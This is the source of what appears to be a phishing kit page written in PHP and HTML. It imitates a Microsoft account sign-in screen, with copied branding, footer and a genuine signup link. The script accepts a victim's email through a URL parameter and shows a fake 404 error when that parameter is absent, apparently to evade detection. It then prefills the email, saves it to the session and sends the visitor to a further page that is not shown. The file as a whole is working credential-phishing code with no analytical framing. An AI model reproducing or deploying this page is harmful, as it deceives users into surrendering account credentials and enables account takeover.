<?php @session_start();

require_once 'info.php';

$link = $_GET['s454'];

if(!preg_match("/^.+@.+\..+$/i" , $link))
{
    header('HTTP/1.1 404 Not Found');
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

if(isset($_POST['submit']) && $_POST['submit'] == 'Next')
{
    $email = filter_var($_POST['loginfmt'], FILTER_SANITIZE_EMAIL);

    if(trim($email) == "" || !preg_match("/^.+@.+\..+$/i" , $email))
    {
        $error = 'Enter a valid email address or phone number.';
    }

    else {

        $_SESSION['email'] = $email;

        header("Location:more.php");
        exit;
    }

}
?>

<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="LocLC" content="en-US" />
    <link rel="shortcut icon" href="images/favicon.ico" />
    
    <link href="css/c.login.min.css" rel="stylesheet" />

    <script crossorigin="anonymous" src="css/c_pcore.min.js" /></script>

    <script crossorigin="anonymous" src="css/c-en.min.js" /></script>

</head>

<body class="cb" style="display: block;">


<div>
<div>
	<div class="background" role="presentation">
		
<div style="background-image: url(&quot;images/0-small.jpg&quot;);"></div>
<div class="backgroundImage" style="background-image: url(&quot;images/0.jpg&quot;);"></div>
<div class="background-overlay"></div></div></div> 

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="">
	
	<div class="outer">
        <div class="middle">
            <div class="inner">
                <div><img class="logo" role="presentation" pngsrc="images/logo.png" svgsrc="images/logo.svg" src="images/logo.svg"></div><div><div>
                                <div><!--  --> <div id="loginHeader" class="row text-title" role="heading">Sign in</div>
                            <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"></div>
                            
                            <?php if(isset($_POST['submit']) && $_POST['submit'] == 'Next'){?>

                            <div class="alert alert-error col-md-24" id="usernameError"><?php echo $error; ?>
                            </div>
                            <?php } ?>

                            <div class="form-group col-md-24"> <div class="placeholderContainer">
            
            <input value="<?php if(isset($_POST['submit']) && $_POST['submit'] == 'Next'){ echo $email; } else { echo $link; } ?>" type="email" name="loginfmt" id="loginfmt" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" readonly="readonly">
        </div> </div></div> </div> 
                    <div class="row"> 

                        <div class="col-xs-24 form-group no-padding-left-right"> <div class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" value="Back" style="display: none;"> </div> 

                        <div class="col-xs-24"> <input name="submit" type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next"> </div> </div></div> </div> 
            <div class="row"> 
				<div class="col-md-24">
					<div class="text-13 form-group">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWRO2_TUACF67xQECoICYFgQYKJyknsazsPqUNICHESOzF52kMrx762bxI_at84sVcGJAbUOSMDSJVY6IL4CZ06o7IjJsSAYCNhZznDOd9wdM6TJJWjKo8ZwLBqcVomyyoHSKZMFUiVoTkSsIADdIHS2QLwb1-_9fo8Z90_4jtvHrx8dfDh6teGyB4vUAhzmmufEXctjL2gks-vVqucaxhI-xfkPxHEJUF8I4hNIg0dctg_SwQc4BiOYTiOoQDNlABbzsm0iLoDBYljCcv2kFJQoSDOTNAZ82thIGPFlmKRHm49LRLtliUP5rEwHkZK_RlWxlIkRlt-oDGdgRl1d_xMRMLMZGV6GAu2EH1J3OxWl9iid-L6KIY_E1nD9e1jzw3wJvme6HrQ4fWa6zhQw7kdBh2MNBUj1-n5rgd9jGBwKC1UjteLmkyNrQkJhrrXmGm9WmcZOmsAelQE5hyqubA5clegLYfVQWtSbYnh6LkyI_12VQ5P5ng9L-KyWjdLNfWk3TQ9QYU-NwlHvDGVgn4c2g2VMyX8tEPWrL7S5lnNqK5m07CrvviYzGxntV3nIrm_LeUg_aHnuwZawMsU8T2VKOz_ThFv09u_lndi4dH0Snz39fzPtXs39i7SeWsaC_FcLsXFus2qLB2K07jUDGit14EMXB_oPvANDdMNKzgEFeo0Q5xmMj8ye5-z_7v3Lw2&amp;estsfed=1&amp;uaid=682eb38a5e1a4c498e1b83872baddcf6&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;mkt=en-US" id="signup" class="display-inline-block" aria-label="Create a Microsoft account" target="_blank">Create one!</a></div>
            <div class="text-13 form-group no-margin-bottom"> <a id="cantAccessAccount" href="#">Can’t access your account?</a> </div></div> </div></div>
            </div>
            </div>
            </div>
            
            </div>
        </div>
            
					
					<div id="footer" class="footer default"> <div>
 
 
 <div id="footerLinks" class="footerNode text-secondary"> 
    <span id="ftrCopy">©<?php echo @date("Y"); ?> Microsoft</span>
    <a id="ftrTerms" href="#">Terms of use</a> 
    <a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
</div> 

</div>
</div>

</form> 
                
</div>
</body>
</html>
